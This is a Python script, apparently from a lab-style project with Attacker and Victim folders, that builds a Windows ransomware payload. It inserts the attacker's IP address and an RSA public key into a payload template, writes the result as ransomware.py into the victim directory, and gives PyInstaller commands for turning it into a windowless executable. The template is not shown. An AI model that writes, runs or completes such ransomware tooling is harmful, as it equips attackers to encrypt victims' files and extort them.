import os
import socket
import sys

print("[+] Building Windows Ransomware Payload...\n")

def get_attacker_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f"[-] Could not auto-detect IP: {e}")
        return "192.168.0.111"  # Default fallback

def build_windows_payload(kali_ip=None):
    """Build the ransomware payload"""
    try:
        # Read the Template
        template_path = os.path.join(os.path.dirname(__file__), "payload_template.py")
        with open(template_path, "r") as f:
            template = f.read()
        
        # Read the Public Key
        key_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "Keys", "public_key.pem")
        with open(key_path, "r") as f:
            PUBLIC_KEY = f.read().strip()
        
        # Get attacker IP
        if not kali_ip:
            kali_ip = get_attacker_ip()
        print(f"[+] Attacker IP: {kali_ip}")
        
        # Replace placeholders in template
        payload_code = template.replace("KALI_IP_HERE", kali_ip)
        payload_code = payload_code.replace('''with open("./Keys/public_key.pem", "r") as f:
    PUBLIC_KEY = f.read().strip()''', f"PUBLIC_KEY = '''{PUBLIC_KEY}'''")
        
        # Save the final payload
        target_dir = os.path.abspath(
            os.path.join(os.path.dirname(__file__), '..', '..', 'Victim', 'src')
        )
        os.makedirs(target_dir, exist_ok=True)
        
        target = os.path.join(target_dir, 'ransomware.py')
        with open(target, 'w') as f:
            f.write(payload_code)
        
        print(f"[+] Payload created: {target}")
        print("[+] Convert to EXE on Windows using:")
        print("    pip install pyinstaller")
        print("    pyinstaller --onefile --noconsole ransomware.py")
        print("[+] Output will be in dist/ransomware.exe")
        
        return target
        
    except Exception as e:
        print(f"[-] Error building payload: {e}")
        raise

if __name__ == "__main__":
    # Test the function
    build_windows_payload()